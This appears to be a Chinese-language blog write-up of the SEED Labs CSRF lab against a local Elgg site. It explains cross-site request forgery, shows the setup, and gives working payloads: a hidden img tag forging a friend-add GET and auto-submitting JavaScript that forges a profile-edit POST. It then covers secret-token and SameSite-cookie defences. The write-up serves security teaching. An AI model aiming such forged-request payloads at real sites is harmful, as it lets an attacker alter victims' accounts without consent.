---
title: CSRF-Attack-Lab
categories:
  - SeedLabs/WebSecurity
tags:
  - CSRF
abbrlink: 157470a3
date: 2023-04-09 23:34:43
---

## 跨站请求

当用户在访问 A 网站时，A 网站里有一些访问 B 网站的链接，如图片等。在访问 B 网站时，浏览器会把所有和 B 网站有关的 cookies 附加到该请求上。

如果 A 网站是一个恶意网站，里面有一些其他网站的链接，这些链接可以直接修改、获取到某些数据时，就是跨站请求伪造攻击。GET 方法，只需要在 html 中嵌入 `<img src="xxx" alt="iamge" width="1" height="1" />` 即可；对于 POST 请求，需要使用 JS 来构造。

防御方法：

-   同站 cookie，给 cookie 添加了一个 SameSite 属性，用于告诉浏览器一个 cookie 是否可以跨站请求使用。其中 SameSite=Strict 时，cookie 在跨站请求时不会发送；SameSite=Lax 时，只有顶级导航的跨站请求才会一起发送。
-   秘密令牌。在每个网页内嵌入一个随机的机密值/把一个机密值放在 cookie 中。使用同源策略，不同源的页面不能读取其他源的 cookie 内容。

## 环境配置

我使用的是云服务器，不过，之前都是使用的 SSH 连接。现在，网络安全了之后，需要使用到抓包工具之类的，搞端口转发代理，终归还是不太方便。重新配下吧，搞个 VNC 远程桌面。

```shell
curl -o src-cloud.zip https://seed.nyc3.cdn.digitaloceanspaces.com/src-cloud.zip
unzip src-cloud.zip
./install.sh
# 在安装中，需要选择 Wireshark 为 No，xfce4 为 LightDM
# 对于一些需要从 github 安装的软件，受限于国内网络环境，可能需要手动安装
sudo su seed # 切换到 seed 用户
vncserver -localhost no -geometry 1920x1080 # 启动一个 vnc 服务
# 在本地安装一个 VNC viewer，输入 ip:5901 即可访问。需要服务器开发该端口
vncserver -list    # 查看 VNC 会话
vncserver -kill :1 # 结束 VNC 会话，如果开了多个会话，端口会变化
```

从实验页面下载源文件，然后执行 `dcbuild` 和 `dcup` 启动环境，并且，在 `/etc/hosts` 中配置如下的域名映射。确实离谱，ip 相同，为啥访问结果不同呢？

```
10.9.0.5        www.seed-server.com
10.9.0.5        www.example32.com
10.9.0.105      www.attacker32.com
```

在 `10.9.0.5` 上跑着我们的 elgg 网络程序，在 `10.9.0.105` 上跑着我们的攻击者网页。攻击者网页的 `html` 代码需要我们自行更改，保存在 `Labsetup/attacker` 中。

## CSRF Attack using GET Requset

Samy 想要添加 Alice 好友，但是 Alice 不同意。于是 Samy 需要诱导 Alice 访问恶意网站，恶意网站会调用 Alice 的 `cookie`，秘密的在后台为 Alice 完成添加 Samy 为好友的请求，这样，女神就主动添加 Samy 为好友了。

远程连接上服务器，为 firefox 浏览器安装 HTTP Header Live 插件，随便登录一个用户，用户名密码在实验文档中有，添加 Samy 为好友，可以看到 URL 如下，后面的密码令牌我们暂不考虑，重要的就是拿到这个 `friend=59`，这样，谁访问了 `http://www.seed-server.com/action/friends/add?friend=59` 谁就添加了 Samy 为好友。

```
http://www.seed-server.com/action/friends/add?friend=59xxxx
```

因此，我们修改恶意网站为的 `addfriend.html` 如下，这样浏览器以为是请求 `img`，实则完成了对该特定链接的访问，也就是说，Alice 在不知不觉中添加了 Samy 为好友。不过，这种攻击方法在现在的 firefox 浏览器中已经无法使用了（用提供的虚拟机的话是可以的）

```html
<body>
    <h1>This page forges an HTTP GET request</h1>
    <img src="http://www.seed-server.com/action/friends/add?friend=59" alt="image" width="1" height="1" />
</body>
```

## CSRF Attack using POST Requset

添加了 Alice 为好友后，Samy 还不满足，他想要将 Alice 的个人简介修改为 `Samy is my Hero`，修改个人信息是一个 POST 请求，同样，Samy 可以先修改自己的简介，使用插件拿到 HTTP 请求如下：

```shell
http://www.seed-server.com/action/profile/edit # URL

# 除了不需要的东西，重要的是 name description accesslevel guid
# 和上面拿到 Samy 的 ID 一样，我们可以拿到 Alice 的 guid=56
__elgg_token=nOuayPhDLt-yoisTMOmJZg&__elgg_ts=1681041396&name=Samy&description=<p>hhhhhhhh</p> &accesslevel[description]=2&briefdescription=&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2&guid=59
```

有了这些东西，我们可以构造 HTML 了，这次我们要在 HTML 中嵌入 js 代码，js 代码悄悄地执行如上的请求。

```html
<script type="text/javascript">
    function forge_post() {
        var fields;
        // The following are form entries need to be filled out by attackers.
        // The entries are made hidden, so the victim won't be able to see them.
        fields += "<input type='hidden' name='name' value='Alice'>";
        fields += "<input type='hidden' name='briefdescription' value='Samy is my Hero'>";
        fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
        fields += "<input type='hidden' name='guid' value='56'>";
        // Create a <form> element.
        var p = document.createElement("form");
        // Construct the form
        p.action = "http://www.seed-server.com/action/profile/edit";
        p.innerHTML = fields;
        p.method = "post";
        // Append the form to the current page.
        document.body.appendChild(p);
        // Submit the form
        p.submit();
    }
    // Invoke forge_post() after the page is loaded.
    window.onload = function () { forge_post(); }
</script>
```

当我们重启容器，点击了该按钮，就能得到结果（GET 请求不行）：

![image-20230409224852983](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20230409224852983.png)

如果我们不知道谁会访问我们的攻击网站，那么咋整呢？ 还能攻击吗？应该是只能执行加好友攻击了，修改个性签名这种就不行了。

## 防御

### 秘密令牌

在 elgg 中，使用了 `__elgg_ts` 和 `__elgg_token` 这两个秘密令牌，攻击者拿不到这两个密码令牌，就无法实施攻击。在上面，我们是讲 elgg 对秘密令牌的验证注释掉了，取消注释之后，攻击无法实施。

### SameSite Cookie

在我们访问 `http://www.example32.com/` 时，会在浏览器本地添加 `cookie-normal、cookie-lax、cookie-strict` 这三种 `cookie`。

对于 `Experiment A`，三种请求都可以使用全部的 `cookie`。因为 `Experiment A` 的地址为 `www.example32.com/testing.html` 属于同站请求。

对于 `Experiment B`，GET 请求和 GET 类型的表单请求，都可以使用 `normal-cookie` 和 `lax-cookie`；而 POST 类型的请求，只能使用 `normal-cookie`。因为 `Experiment B` 的地址为 `http://www.example32.com/showcookies.php` 为跨站请求。

`Lax-Cookie` 仅允许 `GET` 请求中的 `Cookie` 在跨站请求时被发送，而不允许 `POST` 请求中的 `Cookie` 发送。这是因为 `GET` 请求通常用于获取资源，例如显示网页或图像。这些请求不会对服务器状态进行更改，并且不会引起安全问题。添加这样的 `Cookie` 有利于用户的体验。

而 `POST` 请求通常用于提交表单或执行其他对服务器状态进行更改的操作。这些请求可能会对用户数据或服务器状态造成安全威胁。因此，禁止 `POST` 请求中的 `Cookie` 在跨站请求时被发送，可以降低 `CSRF` 攻击的风险。